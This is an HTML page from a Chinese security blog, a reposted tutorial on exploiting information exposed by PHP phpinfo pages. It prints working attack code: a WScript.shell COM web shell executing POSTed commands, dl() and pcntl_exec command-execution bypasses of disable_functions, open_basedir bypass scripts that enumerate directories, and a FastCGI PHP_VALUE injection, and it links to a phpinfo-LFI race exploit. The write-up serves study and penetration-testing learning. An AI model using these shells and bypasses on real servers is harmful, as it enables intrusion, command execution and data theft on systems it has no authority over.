@@ -1,0 +1,1188 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Phpinfo页面利用 system 获取具体版本，可以用来提权 extension_dir)php扩展的路径，图省事没用lamp包有点捞…(这里还是说下linux不推荐用phpstudy，很多linux装了phpstudy系统会崩) http_x_real_ip直接获取真实ip，无视代理、cdn。本地环境并没有发现这个参数，应该是ini配置问题。顺便说下HTTP_X_FORWARDED_FOR的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpinfo信息利用">
+<meta property="og:url" content="http://alin.run/2021/04/04/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="alin&#39;Blog">
+<meta property="og:description" content="Phpinfo页面利用 system 获取具体版本，可以用来提权 extension_dir)php扩展的路径，图省事没用lamp包有点捞…(这里还是说下linux不推荐用phpstudy，很多linux装了phpstudy系统会崩) http_x_real_ip直接获取真实ip，无视代理、cdn。本地环境并没有发现这个参数，应该是ini配置问题。顺便说下HTTP_X_FORWARDED_FOR的">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzj3OvZbhCic0ib1zSTrGmzyw65Ody4luqdbfz4CpoZIfdsmP3LoWOkRmbA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzjO65qrkticK3YSwtMia9OZ7rBKjoVPOIFaOwLEvJjJFHpdUguXvoedcog/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzjV1RBodu9XO6aDZUgCnhI0njlR4ia1nXAm4XfNibpiaQXdZmnHQow1vaHA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008eGmZEly1gp7slubbkyj30u00mv439.jpg">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzj6jyZ2wiaHIzrQGFDvkyiaDZWb70Flw9gejFdYqnSAOIWqHHfb3PTwftw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="article:published_time" content="2021-04-04T07:57:38.000Z">
+<meta property="article:modified_time" content="2021-04-04T08:30:13.176Z">
+<meta property="article:author" content="alin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://alin.run/2021/04/04/phpinfo信息利用/"/>
+
+
+
+
+
+  <title>phpinfo信息利用 | alin'Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5e6a61cde714ee04a36217a052cbca33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">alin'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alin.run/2021/04/04/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="alin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mao.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="alin'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpinfo信息利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-04T15:57:38+08:00">
+                2021-04-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Phpinfo页面利用</strong></p>
+<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png" alt="image"></p>
+<p>获取具体版本，可以用来提权</p>
+<h4 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h4><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png" alt="image">)php扩展的路径，图省事没用lamp包有点捞…(这里还是说下linux不推荐用phpstudy，很多linux装了phpstudy系统会崩)</p>
+<h4 id="http-x-real-ip"><a href="#http-x-real-ip" class="headerlink" title="http_x_real_ip"></a>http_x_real_ip</h4><p>直接获取真实ip，无视代理、cdn。本地环境并没有发现这个参数，应该是ini配置问题。顺便说下<code>HTTP_X_FORWARDED_FOR</code>的区别，<code>HTTP_X_FORWARDED_FOR</code>会记录代理过程且可伪造</p>
+<h4 id="Web根目录"><a href="#Web根目录" class="headerlink" title="Web根目录"></a>Web根目录</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzj3OvZbhCic0ib1zSTrGmzyw65Ody4luqdbfz4CpoZIfdsmP3LoWOkRmbA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>找不到路径，报错/找phpinfo常规操作了。</p>
+<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p>phpinfo-lfi getshell 很老的洞了，看到学习下</p>
+<p>像phpinfo页面post数据可以在_FILES[“file1”]中看到上传的临时文件，先构造简单上传页面。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzjO65qrkticK3YSwtMia9OZ7rBKjoVPOIFaOwLEvJjJFHpdUguXvoedcog/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>其中PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、请求到达</span><br><span class="line">2、创建临时文件，并写入上传文件的内容</span><br><span class="line">3、调用相应PHP脚本进行处理，如校验名称、大小等</span><br><span class="line">4、删除临时文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzjV1RBodu9XO6aDZUgCnhI0njlR4ia1nXAm4XfNibpiaQXdZmnHQow1vaHA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>这里可以看到，临时文件可以成功写入，配合lfi即可getshell，不过临时文件很块就会被删除，利用分块传输竞争时间绕过</p>
+<p><a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a></p>
+<p>利用脚本，不过我本地测试失败了</p>
+<p>这里说下这个漏洞感觉还是比较鸡肋(条件有点苛刻)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、phpinfo</span><br><span class="line">2、开启了文件缓存</span><br><span class="line">3、没有gpc等函数限制</span><br><span class="line">4、开启lfi，有包含点</span><br></pre></td></tr></table></figure>
+
+<h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><p>文件包含有多重要自不必多说。</p>
+<h4 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h4><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png" alt="image"></p>
+<p>php标签有四种格式，这个是asp风格的，默认不开启。可以上传.haccess/user.ini 绕过(php7移除)</p>
+<h4 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h4><p>禁用函数列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(dl)</span><br><span class="line">exec</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">proc_open</span><br><span class="line">pcntl_exec</span><br><span class="line">shell_exec</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h5><p>1、记得Seay代码审计里说过<code>dl()</code>函数(需要enable_dl开启)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;PHP5调用方法</span><br><span class="line">dl(&#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;apache&#x2F;htdocs&#x2F;php5.so&#39;);</span><br><span class="line">spiderbiguan(&#39;uname -a&#39;);&#x2F;&#x2F;调用函数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。PHP&gt;4.2.0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php pcntl_exec(“&#x2F;bin&#x2F;bash”, array(“&#x2F;tmp&#x2F;b4dboy.sh”));?&gt;</span><br><span class="line"></span><br><span class="line">#&#x2F;tmp&#x2F;b4dboy.sh</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">ls -l &#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>3、利用ImageMagick漏洞绕过disable_function(应该是要组件与扩展都有具体没测试)</p>
+<p><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></p>
+<p>4、利用环境变量LD_PRELOAD来绕过</p>
+<p><a href="http://www.vuln.cn/6784的确是一种好方法，利用起来也没有那么繁琐。" target="_blank" rel="noopener">http://www.vuln.cn/6784的确是一种好方法，利用起来也没有那么繁琐。</a></p>
+<p>5、win系统组件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_POST[a];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&#39;cmd.exe &#x2F;c &#39;.$command);  &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>魔术引号，它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。顺便提一嘴用了<code>addslshes()</code>除非是有编码问题要不然是不存在注入的。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png" alt="image"></p>
+<h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>将用户可操作的文件限制在某目录下</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png" alt="image"></p>
+<h5 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h5><p>linux下绕过：</p>
+<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
+<p>(大佬博客我这里也复现下)</p>
+<p>1、利用DirectoryIterator + Glob 直接列举目录(linux)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">printf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));</span><br><span class="line">$file_list &#x3D; array();</span><br><span class="line">&#x2F;&#x2F; normal files</span><br><span class="line">$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line">    $file_list[] &#x3D; $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; special files (starting with a dot(.))</span><br><span class="line">$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line">    $file_list[] &#x3D; $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line">foreach($file_list as $f)&#123;</span><br><span class="line">        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gp7slubbkyj30u00mv439.jpg" alt="image-20210404162934945"></p>
+<p>2、realpath列举目录</p>
+<p>利用realpath对传入路径的回显不同加上通配符进行列举。本地环境linux就没有进行测试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;open_basedir&#39;, dirname(__FILE__));</span><br><span class="line">printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));</span><br><span class="line">set_error_handler(&#39;isexists&#39;);</span><br><span class="line">$dir &#x3D; &#39;d:&#x2F;test&#x2F;&#39;;</span><br><span class="line">$file &#x3D; &#39;&#39;;</span><br><span class="line">$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;</span><br><span class="line">for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;</span><br><span class="line">    $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;</span><br><span class="line">    realpath($file);</span><br><span class="line">&#125;</span><br><span class="line">function isexists($errno, $errstr)</span><br><span class="line">&#123;</span><br><span class="line">    $regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;</span><br><span class="line">    preg_match($regexp, $errstr, $matches);</span><br><span class="line">    if (isset($matches[1])) &#123;</span><br><span class="line">        printf(&quot;%s &lt;br&#x2F;&gt;&quot;, $matches[1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先设置open_basedir为当前目录，并枚举d:/test/目录下的所有文件。将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来。</p>
+<p>3、SplFileInfo::getRealPath列举目录</p>
+<p>不需要考虑open_basedir开不开起。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;open_basedir&#39;, dirname(__FILE__));</span><br><span class="line">printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));</span><br><span class="line">$basedir &#x3D; &#39;D:&#x2F;test&#x2F;&#39;;</span><br><span class="line">$arr &#x3D; array();</span><br><span class="line">$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;</span><br><span class="line">for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;</span><br><span class="line">    $info &#x3D; new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;);</span><br><span class="line">    $re &#x3D; $info-&gt;getRealPath();</span><br><span class="line">    if ($re) &#123;</span><br><span class="line">        dump($re);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function dump($s)&#123;</span><br><span class="line">    echo $s . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    ob_flush();</span><br><span class="line">    flush();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还有GD库imageftbbox/imagefttext列举目录bindtextdomain暴力猜解目录，基本也都是要暴力破解，效率比较低。还有这篇文章php5全版本绕过open_basedir读文件脚本给跪了</p>
+<p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">https://www.leavesongs.com/bypass-open-basedir-readfile.html</a></p>
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h4><p>这个的远程执行</p>
+<h4 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h4><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p>
+<h4 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h4><p>Memcache未授权访问漏洞利用及修复：</p>
+<p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="noopener">http://blog.nsfocus.net/memcache-unauthorized-access-exploit/</a></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9UCPb8Colll2juiava2sqzj6jyZ2wiaHIzrQGFDvkyiaDZWb70Flw9gejFdYqnSAOIWqHHfb3PTwftw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><p>这个不多说了……</p>
+<h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><h4 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h4><h4 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h4><p>利用 Gopher 协议拓展攻击面：</p>
+<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+<p>看了下尝试复现没有成功，我的理解是首先要支持gopher协议，然后找到一个能执行curl会话的参数，构造gopher格式的payload以post格式去执行反弹shell。(并没有看懂是怎么利用的)</p>
+<h4 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi</a></p>
+<p>通过fastcgi传入环境变量，设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D;php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">&#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br></pre></td></tr></table></figure>
+
+<p>将执行的代码放在body中执行任意代码。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从刚接触安全的时候就知道phpinfo里有很重要的信息，然而就在前几天我还直接提了个信息泄露(还撞了，丢脸),复现完真的学到很多。</p>
+<p>参考链接：</p>
+<p><a href="https://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/79830.html</a></p>
+<p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0151653.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0151653.html</a></p>
+<p><a href="https://bbs.ichunqiu.com/thread-3234-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-3234-1-1.html</a></p>
+<p><strong>原文地址</strong></p>
+<p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/" target="_blank" rel="noopener">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/</a></p>
+<p>from HACK学习呀</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持技术分享，你的支持鼓励我！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechat.jpeg" alt="alin 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpeg" alt="alin 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/29/kali%E5%B7%A5%E5%85%B7%E7%AC%94%E8%AE%B0/" rel="next" title="kali工具笔记">
+                <i class="fa fa-chevron-left"></i> kali工具笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/04/05/Meterpreter%E5%91%BD%E4%BB%A4/" rel="prev" title="Meterpreter命令">
